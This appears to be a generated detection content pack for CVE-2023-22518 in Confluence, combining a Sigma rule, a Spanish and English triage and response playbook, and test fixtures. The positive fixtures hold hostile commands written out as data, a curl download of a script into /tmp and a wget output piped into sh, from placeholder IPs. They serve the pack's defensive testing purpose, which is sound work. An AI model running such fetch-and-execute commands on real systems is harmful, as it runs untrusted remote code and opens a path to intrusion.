@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "f8987c03-4290-4c96-870f-55e75ee377f4",
+    "title": "CVE-2023-22518 Exploitation Attempt - Suspicious Confluence Child Process (Linux)",
+    "level": "high",
+    "status": "test",
+    "author": "Andreas Braathen (mnemonic.io)",
+    "path": "2023/Exploits/CVE-2023-22518/proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-emerging-threats/2023/Exploits/CVE-2023-22518/proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059",
+      "T1190"
+    ],
+    "folder": "rules-emerging-threats"
+  },
+  "playbook": {
+    "es": {
+      "summary": "El proceso Java de Confluence en un servidor Linux inició bash, curl, echo o wget. Este patrón coincide con la explotación de CVE-2023-22518 para ejecutar comandos o descargar payloads.",
+      "what_it_detects": "Creación de procesos en Linux cuyo ParentImage termina en /java y cuyo ParentCommandLine contiene 'confluence', con un hijo (Image) /bash, /curl, /echo o /wget. Se excluyen los CommandLine que contienen 'ulimit -u', usados por los scripts de arranque.",
+      "why_it_matters": "CVE-2023-22518 es una falla de autorización incorrecta en Confluence Data Center y Server. Un atacante puede crear cuentas de administrador y ejecutar comandos (T1190, explotación de aplicación expuesta; T1059, intérprete de comandos). Una de las referencias describe el despliegue de ransomware por esta vía.",
+      "triage_steps": [
+        "Revise el CommandLine del hijo: busque URLs, IPs externas, descargas a /tmp o /dev/shm, pipes a sh y cadenas codificadas en base64.",
+        "Confirme con ParentCommandLine que el padre es la instancia de Confluence e identifique la versión instalada frente al aviso de Atlassian.",
+        "Revise los procesos hijos y nietos del mismo host en +/- 15 minutos: shells inversas, cron, nuevos usuarios, cifrado masivo de archivos.",
+        "Revise los logs de acceso de Confluence en esa ventana: solicitudes a /json/setup-restore.action, /json/setup-restore-local.action o /server-info.action y las IPs de origen.",
+        "Busque en la administración de Confluence cuentas de administrador creadas recientemente o restauraciones de respaldo no autorizadas.",
+        "Valide si se crearon archivos o conexiones salientes hacia los dominios o IPs presentes en el CommandLine.",
+        "Busque alertas anteriores para el mismo host y las mismas IPs de origen en otros servidores Confluence."
+      ],
+      "false_positives": [
+        "La regla indica que es poco probable; puede generarse si un plugin o script de mantenimiento de Confluence invoca bash, curl o wget de forma legítima.",
+        "Chequeos de salud o integraciones configuradas por administradores que llaman a curl desde la JVM; validelo con el equipo responsable."
+      ],
+      "response_steps": [
+        "Si el comando es malicioso, aísle el servidor de la red y conserve memoria, logs de Confluence y archivos descargados antes de cualquier cambio.",
+        "Bloquee las IPs y dominios de origen y de descarga en el perímetro y el proxy.",
+        "Elimine las cuentas de administrador no autorizadas, rote credenciales del servicio y de la base de datos, y retire mecanismos de persistencia.",
+        "Aplique la actualización de Atlassian o restaure desde un respaldo limpio verificado y restrinja la exposición de Confluence a Internet."
+      ],
+      "severity_rationale": "Es alta porque un shell o descargador iniciado por la JVM de Confluence rara vez es legítimo e indica una posible ejecución remota de código en un servidor expuesto."
+    },
+    "en": {
+      "summary": "The Confluence Java process on a Linux server spawned bash, curl, echo or wget. This pattern matches exploitation of CVE-2023-22518 to run commands or fetch payloads.",
+      "what_it_detects": "Linux process creation where ParentImage ends in /java and ParentCommandLine contains 'confluence', and the child Image is /bash, /curl, /echo or /wget. CommandLines containing 'ulimit -u', used by startup scripts, are excluded.",
+      "why_it_matters": "CVE-2023-22518 is an improper authorization flaw in Confluence Data Center and Server. Attackers can create admin accounts and execute commands (T1190, exploit public-facing application; T1059, command interpreter). A reference describes ransomware deployment through it.",
+      "triage_steps": [
+        "Read the child CommandLine: look for URLs, external IPs, downloads to /tmp or /dev/shm, pipes into sh, and base64-encoded strings.",
+        "Confirm from ParentCommandLine that the parent is the Confluence instance and check the installed version against the Atlassian advisory.",
+        "Review child and grandchild processes on the same host within +/- 15 minutes: reverse shells, cron changes, new users, mass file encryption.",
+        "Check Confluence access logs in that window for requests to /json/setup-restore.action, /json/setup-restore-local.action or /server-info.action and their source IPs.",
+        "Look in Confluence administration for recently created admin accounts or unauthorized backup restores.",
+        "Verify files written and outbound connections to the domains or IPs present in the CommandLine.",
+        "Search earlier alerts for the same host and source IPs across other Confluence servers."
+      ],
+      "false_positives": [
+        "The rule rates false positives as unlikely; a Confluence plugin or maintenance script legitimately invoking bash, curl or wget could trigger it.",
+        "Admin-configured health checks or integrations calling curl from the JVM; confirm with the owning team."
+      ],
+      "response_steps": [
+        "If malicious, isolate the server and preserve memory, Confluence logs and downloaded files before making changes.",
+        "Block source and download IPs and domains at the perimeter and proxy.",
+        "Remove unauthorized admin accounts, rotate service and database credentials, and remove persistence.",
+        "Apply the Atlassian fix or restore from a verified clean backup, and restrict Confluence exposure to the Internet."
+      ],
+      "severity_rationale": "High fits because a shell or downloader spawned by the Confluence JVM is rarely legitimate and signals possible remote code execution on an exposed server."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Confluence JVM spawns curl to download a script from an external IP into /tmp",
+        "event": {
+          "ParentImage": "/opt/atlassian/confluence/jre/bin/java",
+          "ParentCommandLine": "/opt/atlassian/confluence/jre/bin/java -Djava.util.logging.config.file=/opt/atlassian/confluence/conf/logging.properties -Dconfluence.home=/var/atlassian/application-data/confluence org.apache.catalina.startup.Bootstrap start",
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -s http://203.0.113.45/x.sh -o /tmp/x.sh",
+          "User": "confluence",
+          "ProcessId": 48213,
+          "ParentProcessId": 1532,
+          "Computer": "wiki-01.example.com"
+        }
+      },
+      {
+        "description": "Confluence JVM spawns bash that pipes a wget download into sh",
+        "event": {
+          "ParentImage": "/opt/atlassian/confluence/jre/bin/java",
+          "ParentCommandLine": "/opt/atlassian/confluence/jre/bin/java -Dcatalina.base=/opt/atlassian/confluence org.apache.catalina.startup.Bootstrap start",
+          "Image": "/bin/bash",
+          "CommandLine": "/bin/bash -c wget -qO- http://198.51.100.20/run | sh",
+          "User": "confluence",
+          "ProcessId": 48377,
+          "ParentProcessId": 1532,
+          "Computer": "wiki-01.example.com"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Confluence startup bash running ulimit -u, excluded by the filter",
+        "event": {
+          "ParentImage": "/opt/atlassian/confluence/jre/bin/java",
+          "ParentCommandLine": "/opt/atlassian/confluence/jre/bin/java -Dconfluence.home=/var/atlassian/application-data/confluence org.apache.catalina.startup.Bootstrap start",
+          "Image": "/bin/bash",
+          "CommandLine": "/bin/bash -c ulimit -u",
+          "User": "confluence",
+          "ProcessId": 1601,
+          "ParentProcessId": 1532,
+          "Computer": "wiki-01.example.com"
+        }
+      },
+      {
+        "description": "curl spawned by a Jenkins Java process, not Confluence",
+        "event": {
+          "ParentImage": "/usr/lib/jvm/java-17-openjdk/bin/java",
+          "ParentCommandLine": "/usr/lib/jvm/java-17-openjdk/bin/java -jar /usr/share/java/jenkins.war --httpPort=8080",
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -s https://updates.example.org/update-center.json",
+          "User": "jenkins",
+          "ProcessId": 22014,
+          "ParentProcessId": 980,
+          "Computer": "ci-02.example.com"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:24:06+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
